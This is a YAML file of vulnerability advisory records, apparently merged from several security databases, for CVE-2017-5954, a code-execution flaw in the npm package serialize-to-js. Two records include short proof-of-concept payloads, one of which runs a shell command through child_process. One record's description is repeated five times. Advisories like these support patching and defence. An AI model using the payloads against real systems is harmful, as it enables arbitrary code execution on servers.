---
- id: nodesecurity:npm:serialize-to-js:2017-02-10
  title: Code Execution Through IIFE
  description: "Affected versions of `serialize-to-js` may be vulnerable to arbitrary
    code execution through an Immediately Invoked Function Expression (IIFE). \n\n##
    Proof of Concept\n```\nvar payload = \"{e: (function(){ eval('console.log(`exploited`)')
    })() }\"\nvar serialize = require('serialize-to-js');\nserialize.deserialize(payload);\n```"
  affected_package: serialize-to-js
  vulnerable_versions:
  - "<=0.5.0"
  patched_versions:
  - ">=1.0.0"
  severity: high
  package_manager: npm
  cve:
  - CVE-2017-5954
  cvss_v3_vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  credit:
  - Ajin Abraham
  references:
  - https://www.npmjs.com/package/serialize-to-js#deserialize
  source_url: https://nodesecurity.io/advisories/313
- id: ossindex:npm:serialize-to-js:2017-02-10
  title: "[CVE-2017-5954]  Deserialization of Untrusted Data"
  description: An issue was discovered in the serialize-to-js package 0.5.0 for Node.js.
    Untrusted data passed into the deserialize() function can be exploited to achieve
    arbitrary code execution by passing a JavaScript Object with an Immediately Invoked
    Function Expression (IIFE).
  affected_package: serialize-to-js
  vulnerable_versions:
  - "<=0.5.0"
  package_manager: npm
  cve:
  - CVE-2017-5954
  credit:
  - OSSIndex
  references:
  - http://www.securityfocus.com/bid/96223
  - https://github.com/commenthol/serialize-to-js/issues/1
  - https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
  source_url: https://ossindex.net/resource/package/7014431649/vulnerabilities
- id: ossindex:npm:serialize-to-js:2017-02-11
  title: Code Execution Through IIFE
  description: "> Passing untrusted data to the .deserialize function can cause arbitrary
    code execution through an Immediately Invoked Function Expression (IIFE).\n> \n>
    -- [nodesecurity.io](https://nodesecurity.io/advisories/313)"
  affected_package: serialize-to-js
  vulnerable_versions:
  - "<=0.5.0"
  package_manager: npm
  credit:
  - OSSIndex
  references:
  - https://github.com/commenthol/serialize-to-js/issues/1
  - https://nodesecurity.io/advisories/313
  - https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
  - https://www.npmjs.com/package/serialize-to-js#deserialize
  source_url: https://ossindex.net/resource/package/7014431649/vulnerabilities
- id: snykio:npm:serialize-to-js:2017-02-08
  title: Arbitrary Code Execution
  description: |
    [`serialize-to-js`][1] serializes objects to javascript.

    Affected versions of this package are vulnerable to Arbitrary Code
    Execution. If untrusted user-input is passed into the `deserialize()`,
    attackers will be able to send a serialized JavaScript Objects with an
    [Immediately Invoked Function Expression (IIFE)][2].

    **Example:**

        var serialize = require('serialize-to-js');
        var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
        serialize.deserialize(payload);



    [1]: https://www.npmjs.com/package/serialize-to-js
    [2]: https://en.wikipedia.org/wiki/Immediately-invoked_function_expression
    \n[`serialize-to-js`][1] serializes objects to javascript.

    Affected versions of this package are vulnerable to Arbitrary Code
    Execution. If untrusted user-input is passed into the `deserialize()`,
    attackers will be able to send a serialized JavaScript Objects with an
    [Immediately Invoked Function Expression (IIFE)][2].

    **Example:**

        var serialize = require('serialize-to-js');
        var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
        serialize.deserialize(payload);



    [1]: https://www.npmjs.com/package/serialize-to-js
    [2]: https://en.wikipedia.org/wiki/Immediately-invoked_function_expression
    \n[`serialize-to-js`][1] serializes objects to javascript.

    Affected versions of this package are vulnerable to Arbitrary Code
    Execution. If untrusted user-input is passed into the `deserialize()`,
    attackers will be able to send a serialized JavaScript Objects with an
    [Immediately Invoked Function Expression (IIFE)][2].

    **Example:**

        var serialize = require('serialize-to-js');
        var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
        serialize.deserialize(payload);



    [1]: https://www.npmjs.com/package/serialize-to-js
    [2]: https://en.wikipedia.org/wiki/Immediately-invoked_function_expression
    \n[`serialize-to-js`][1] serializes objects to javascript.

    Affected versions of this package are vulnerable to Arbitrary Code
    Execution. If untrusted user-input is passed into the `deserialize()`,
    attackers will be able to send a serialized JavaScript Objects with an
    [Immediately Invoked Function Expression (IIFE)][2].

    **Example:**

        var serialize = require('serialize-to-js');
        var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
        serialize.deserialize(payload);



    [1]: https://www.npmjs.com/package/serialize-to-js
    [2]: https://en.wikipedia.org/wiki/Immediately-invoked_function_expression
    \n[`serialize-to-js`][1] serializes objects to javascript.

    Affected versions of this package are vulnerable to Arbitrary Code
    Execution. If untrusted user-input is passed into the `deserialize()`,
    attackers will be able to send a serialized JavaScript Objects with an
    [Immediately Invoked Function Expression (IIFE)][2].

    **Example:**

        var serialize = require('serialize-to-js');
        var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
        serialize.deserialize(payload);



    [1]: https://www.npmjs.com/package/serialize-to-js
    [2]: https://en.wikipedia.org/wiki/Immediately-invoked_function_expression
  affected_package: serialize-to-js
  vulnerable_versions:
  - "<=0.5.0"
  severity: high
  package_manager: npm
  cve:
  - CVE-2017-5954
  cwe:
  - CWE-502
  credit:
  - Ajin Abraham
  references:
  - https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
  - https://github.com/commenthol/serialize-to-js/issues/1
  - https://github.com/commenthol/serialize-to-js/commit/1cd433960e5b9db4c0b537afb28366198a319429
  - https://www.npmjs.com/package/serialize-to-js#deserialize
  source_url: https://snyk.io/vuln/npm:serialize-to-js:20170208
